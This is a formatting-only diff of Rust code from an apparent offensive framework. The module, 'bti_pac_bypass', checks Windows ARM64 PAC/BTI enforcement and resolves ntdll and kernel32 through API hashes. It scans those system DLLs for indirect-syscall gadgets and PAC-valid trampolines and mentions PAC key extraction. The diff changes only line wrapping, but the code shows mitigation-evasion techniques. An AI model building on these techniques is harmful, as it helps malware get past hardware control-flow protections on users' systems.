@@ -389,13 +389,17 @@ pub fn init_from_config(config: &common::config::BtiPacConfig) {
                 PAC_STATE.store(PAC_ACTIVE_KEYS_AVAILABLE, Ordering::SeqCst);
                 KEYS_EXTRACTED.store(true, Ordering::SeqCst);
             } else {
-                tracing::warn!("bti_pac_bypass: PAC key extraction failed, falling back to trampoline routing");
+                tracing::warn!(
+                    "bti_pac_bypass: PAC key extraction failed, falling back to trampoline routing"
+                );
                 PAC_STATE.store(PAC_ACTIVE_TRAMPOLINE_ONLY, Ordering::SeqCst);
             }
         }
         #[cfg(not(feature = "kernel-callback"))]
         {
-            tracing::warn!("bti_pac_bypass: key extraction requested but kernel-callback feature not enabled");
+            tracing::warn!(
+                "bti_pac_bypass: key extraction requested but kernel-callback feature not enabled"
+            );
             PAC_STATE.store(PAC_ACTIVE_TRAMPOLINE_ONLY, Ordering::SeqCst);
         }
     }
@@ -532,10 +536,7 @@ fn detect_pac_bti_state() {
     // hardware enforcement depends on the CPU.  On Windows 11 22H2+
     // (build 22621+), PAC is enforced on all ARM64 systems that support it.
     if build < 19041 {
-        tracing::info!(
-            "bti_pac_bypass: build {} < 19041, PAC not supported",
-            build
-        );
+        tracing::info!("bti_pac_bypass: build {} < 19041, PAC not supported", build);
         PAC_STATE.store(PAC_INACTIVE, Ordering::SeqCst);
         return;
     }
@@ -547,7 +548,9 @@ fn detect_pac_bti_state() {
     let pac_available = check_processor_feature(PF_ARM_64BIT_POINTER_AUTH);
 
     if !pac_available {
-        tracing::info!("bti_pac_bypass: CPU does not support PAC (PF_ARM_64BIT_POINTER_AUTH = false)");
+        tracing::info!(
+            "bti_pac_bypass: CPU does not support PAC (PF_ARM_64BIT_POINTER_AUTH = false)"
+        );
         PAC_STATE.store(PAC_INACTIVE, Ordering::SeqCst);
         return;
     }
@@ -586,8 +589,7 @@ fn check_processor_feature(feature: u32) -> bool {
         }
     };
 
-    let is_present: FnIsProcessorFeaturePresent =
-        unsafe { std::mem::transmute(kernel32) };
+    let is_present: FnIsProcessorFeaturePresent = unsafe { std::mem::transmute(kernel32) };
 
     unsafe { is_present(feature) != 0 }
 }
@@ -618,12 +620,11 @@ fn is_pac_enforced_via_policy() -> bool {
     }
 
     // Try to resolve via pe_resolve hashes (same pattern as cet_bypass).
-    let kernel32 = match unsafe {
-        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
-    } {
-        Some(b) => b,
-        None => return false,
-    };
+    let kernel32 =
+        match unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) } {
+            Some(b) => b,
+            None => return false,
+        };
 
     let get_policy_addr = match unsafe {
         pe_resolve::get_proc_address_by_hash(
@@ -653,7 +654,9 @@ fn is_pac_enforced_via_policy() -> bool {
 
     if result == 0 {
         // Failed to query — assume not enforced.
-        tracing::debug!("bti_pac_bypass: GetProcessMitigationPolicy failed, assuming PAC not enforced");
+        tracing::debug!(
+            "bti_pac_bypass: GetProcessMitigationPolicy failed, assuming PAC not enforced"
+        );
         return false;
     }
 
@@ -677,16 +680,16 @@ fn scan_bti_gadgets_in_system_dlls() {
     let mut gadgets = Vec::new();
 
     // Scan ntdll.dll — the primary target for indirect syscall gadgets.
-    if let Some(ntdll) = unsafe {
-        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
-    } {
+    if let Some(ntdll) =
+        unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) }
+    {
         scan_dll_for_bti(ntdll, "ntdll.dll", &mut gadgets);
     }
 
     // Scan kernel32.dll — useful for API call routing.
-    if let Some(kernel32) = unsafe {
-        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
-    } {
+    if let Some(kernel32) =
+        unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) }
+    {
         scan_dll_for_bti(kernel32, "kernel32.dll", &mut gadgets);
     }
 
@@ -714,10 +717,8 @@ fn scan_dll_for_bti(dll_base: usize, dll_name: &'static str, gadgets: &mut Vec<B
     }
 
     // Read COFF header.
-    let num_sections =
-        unsafe { *(dos_header.add(pe_offset + 6) as *const u16) } as usize;
-    let optional_header_size =
-        unsafe { *(dos_header.add(pe_offset + 20) as *const u16) } as usize;
+    let num_sections = unsafe { *(dos_header.add(pe_offset + 6) as *const u16) } as usize;
+    let optional_header_size = unsafe { *(dos_header.add(pe_offset + 20) as *const u16) } as usize;
 
     // Section headers start after the optional header.
     let sections_offset = pe_offset + 4 + 20 + optional_header_size;
@@ -727,10 +728,9 @@ fn scan_dll_for_bti(dll_base: usize, dll_name: &'static str, gadgets: &mut Vec<B
         let section_ptr = unsafe { dos_header.add(section_offset) };
 
         // Read section name.
-        let name =
-            std::str::from_utf8(unsafe { &*(section_ptr as *const [u8; 8]) })
-                .unwrap_or("")
-                .trim_end_matches('\0');
+        let name = std::str::from_utf8(unsafe { &*(section_ptr as *const [u8; 8]) })
+            .unwrap_or("")
+            .trim_end_matches('\0');
 
         if name != ".text" {
             continue;
@@ -799,15 +799,15 @@ pub fn discover_pac_trampolines() -> Vec<PacTrampoline> {
     let mut trampolines = Vec::new();
 
     // Scan ntdll.dll and kernel32.dll for PAC-valid trampolines.
-    if let Some(ntdll) = unsafe {
-        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
-    } {
+    if let Some(ntdll) =
+        unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) }
+    {
         scan_dll_for_pac_trampolines(ntdll, "ntdll.dll", &mut trampolines);
     }
 
-    if let Some(kernel32) = unsafe {
-        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
-    } {
+    if let Some(kernel32) =
+        unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) }
+    {
         scan_dll_for_pac_trampolines(kernel32, "kernel32.dll", &mut trampolines);
     }
 
@@ -844,19 +844,16 @@ fn scan_dll_for_pac_trampolines(
         return;
     }
 
-    let num_sections =
-        unsafe { *(dos_header.add(pe_offset + 6) as *const u16) } as usize;
-    let optional_header_size =
-        unsafe { *(dos_header.add(pe_offset + 20) as *const u16) } as usize;
+    let num_sections = unsafe { *(dos_header.add(pe_offset + 6) as *const u16) } as usize;
+    let optional_header_size = unsafe { *(dos_header.add(pe_offset + 20) as *const u16) } as usize;
     let sections_offset = pe_offset + 4 + 20 + optional_header_size;
 
     for i in 0..num_sections {
         let section_offset = sections_offset + i * 40;
         let section_ptr = unsafe { dos_header.add(section_offset) };
-        let name =
-            std::str::from_utf8(unsafe { &*(section_ptr as *const [u8; 8]) })
-                .unwrap_or("")
-                .trim_end_matches('\0');
+        let name = std::str::from_utf8(unsafe { &*(section_ptr as *const [u8; 8]) })
+            .unwrap_or("")
+            .trim_end_matches('\0');
 
         if name != ".text" {
             continue;
@@ -1354,7 +1351,9 @@ mod key_extraction {
         );
 
         // Scan ±64 bytes (9 candidate offsets) in 8-byte aligned steps.
-        let probe_range: Vec<i32> = vec![-64, -56, -48, -40, -32, -24, -16, -8, 0, 8, 16, 24, 32, 40, 48, 56, 64];
+        let probe_range: Vec<i32> = vec![
+            -64, -56, -48, -40, -32, -24, -16, -8, 0, 8, 16, 24, 32, 40, 48, 56, 64,
+        ];
 
         for delta in &probe_range {
             let candidate = (base_offset as i64 + *delta as i64) as usize;
